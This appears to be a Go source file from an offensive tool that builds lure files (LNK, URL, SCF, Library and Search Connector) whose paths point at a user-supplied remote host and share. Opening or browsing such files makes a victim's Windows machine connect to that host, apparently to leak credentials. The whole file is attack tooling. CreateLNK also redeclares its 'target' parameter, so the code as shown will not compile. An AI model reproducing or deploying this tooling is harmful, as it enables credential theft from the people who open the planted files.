package Manager

import (
	"Rocabella/Packages/Colors"
	"Rocabella/Packages/Output"
	"Rocabella/Packages/Templates"
	"Rocabella/Packages/Utils"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// CreateLNK function
func CreateLNK(target string, output string, description string, port string, share string) {
	logger := log.New(os.Stderr, "[!] ", 0)

	fmt.Printf("[+] Preparing your malicious LNK file...\n\n")
	
	target := "\\\\" + target + "@" + port + "\\" + share

	// Record the start time
	LNKCreationStartTime := time.Now()

	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	defer ole.CoUninitialize()

	// Create an instance of the WScript Shell
	unknown, error := oleutil.CreateObject("WScript.Shell")
	if error != nil {
		logger.Fatal("Error: ", error)
		return
	}
	defer unknown.Release()

	shell, error := unknown.QueryInterface(ole.IID_IDispatch)
	if error != nil {
		logger.Fatal("Error: ", error)
		return
	}
	defer shell.Release()

	// Get the shortcut object
	shortcut, error := oleutil.CallMethod(shell, "CreateShortcut", output)
	if error != nil {
		logger.Fatal("Error: ", error)
		return
	}

	// Set properties of the shortcut
	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", target)
	oleutil.PutProperty(shortcut.ToIDispatch(), "Description", description)
	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", target)
	oleutil.PutProperty(shortcut.ToIDispatch(), "WindowStyle", 7)

	// Save the shortcut
	oleutil.CallMethod(shortcut.ToIDispatch(), "Save")

	// Record the end time
	LNKCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	LNKCreationDuration := LNKCreationEndTime.Sub(LNKCreationStartTime)

	fmt.Printf("[+] LNK shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), LNKCreationDuration)
}

// CreateURL function
func CreateURL(target string, output string, url string, workingDir string, port string) {
	fmt.Printf("[+] Preparing your malicious URL file...\n\n")

	// Set the target path
	target = target + "@" + port

	// Record the start time
	URLCreationStartTime := time.Now()

	// Get the URL file template with provided values
	urlFileContent := Templates.GetURLFileTemplate(url, workingDir, target)

	// Record the end time
	URLCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	URLCreationDuration := URLCreationEndTime.Sub(URLCreationStartTime)

	// Call function named WriteToFile
	Output.WriteToFile(output, urlFileContent)

	fmt.Printf("[+] URL shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), URLCreationDuration)
}

// CreateSCF function
func CreateSCF(target string, output string, port string) {
	fmt.Printf("[!] Scf files are deprecated and may not work on newer versions of Windows!\n\n")
	fmt.Printf("[+] Preparing your malicious SCF file...\n\n")

	// Set the target path
	target = target + "@" + port

	// Record the start time
	SCFCreationStartTime := time.Now()

	// Get the SCF file template with provided values
	scfFileContent := Templates.GetSCFileTemplate(target)

	// Record the end time
	SCFCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	SCFCreationDuration := SCFCreationEndTime.Sub(SCFCreationStartTime)

	// Call function named WriteToFile
	Output.WriteToFile(output, scfFileContent)

	fmt.Printf("[+] SCF shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), SCFCreationDuration)
}

// CreateLIB function
func CreateLIB(target string, output string, port string, share string) {
	fmt.Printf("[+] Preparing your malicious Library file...\n\n")

	// Set the target path
	target = target + "@" + port

	// Record the start time
	LIBCreationStartTime := time.Now()

	// Get the Library file template with provided values
	libraryFileContent := Templates.GetLibraryFileTemplate(target, share)

	// Record the end time
	LIBCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	LIBCreationDuration := LIBCreationEndTime.Sub(LIBCreationStartTime)

	// Call function named WriteToFile
	Output.WriteToFile(output, libraryFileContent)

	fmt.Printf("[+] Library file successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), LIBCreationDuration)
}

// CreateSearchConnector function
func CreateSearchConnector(target string, output string, port string, share string, description string) {
	fmt.Printf("[+] Preparing your malicious Search Connector file...\n\n")

	// Set the target path
	target = target + "@" + port

	// Record the start time
	SearchConnectorCreationStartTime := time.Now()

	// Get the Search Connector file template with provided values
	searchConnectorFileContent := Templates.GetSearchConnectorFileTemplate(target, share, description)

	// Record the end time
	SearchConnectorCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	SearchConnectorCreationDuration := SearchConnectorCreationEndTime.Sub(SearchConnectorCreationStartTime)

	// Call function named WriteToFile
	Output.WriteToFile(output, searchConnectorFileContent)

	fmt.Printf("[+] Search Connector file successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), SearchConnectorCreationDuration)
}
